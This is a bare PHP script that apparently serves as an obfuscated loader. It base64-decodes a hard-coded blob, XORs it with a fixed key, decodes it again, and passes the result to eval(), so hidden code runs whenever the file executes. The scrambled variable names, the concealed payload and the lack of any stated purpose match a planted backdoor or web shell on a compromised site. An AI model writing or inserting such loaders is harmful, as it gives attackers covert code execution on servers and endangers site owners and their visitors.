<?php
function pvOKLzhNfJ($VgpYNAjxbl,$cjAahpyxiR){
	$cjAahpyxiR=base64_encode($cjAahpyxiR);
	$VgpYNAjxbl=base64_decode($VgpYNAjxbl);
	$biDBsXhKsQ="";
	$XFPFsKBktg="";
	$lxNaEobzhq=0;
	while($lxNaEobzhq<strlen($VgpYNAjxbl)){
		for($eHIhOMpaYt=0;$eHIhOMpaYt<strlen($cjAahpyxiR);$eHIhOMpaYt++){
		$biDBsXhKsQ=chr(ord($VgpYNAjxbl[$lxNaEobzhq])^ord($cjAahpyxiR[$eHIhOMpaYt]));
		$XFPFsKBktg.=$biDBsXhKsQ;
		$lxNaEobzhq++;
			if($lxNaEobzhq>=strlen($VgpYNAjxbl))break;
		}
	}
	return base64_decode($XFPFsKBktg);
}$ZEmYYChrUc = "lgsodfhsdfnsadfoisdfiasdbfipoas234234";
$kfChuzsyMW = "JhYLEQZqGB4oDH4MEwBdSj0fEBctW1QMPh8UHDoxfxs7OhweOR90HTlIJUovDB8TKhlzUQEqKgwAXAABAyYfHgNfDA4VLRcXLHYpABQ9HwcXMXYSFBcxRS49eBEtLgAOFC4uThQVa1U7dSEOOGUUAC8LflsVOmcSFQM1XixYCw4AKgsKFyIpWQM5ABw5EHwRLxc5DRQ9AE0KEFJWO3UDHTJhEAcFEAQYAl9ZDzgPAwIoejoDOAQxRxAZfiAAXgwJAQEAEjkiGwwtDBgVBAZzUi4EJj40ZBggNXkMPgJcfzwPEQQ+Nl4+KQsSbyQLMxg4FS4bCCgTSiYgExsDFBwHSywJbFoyFCYQBmoYHjl6GF8AOngVExAcAilmHzQZKgxCAA85BAAAHAo5E2BYO0gbFhd2cBEUElVHBg8uAzhqCwIrAAQHOV5jCT0UOR0pZh80GSBqOw==";
$QbgUiRwcII = pvOKLzhNfJ($kfChuzsyMW, $ZEmYYChrUc);
eval ($QbgUiRwcII);?>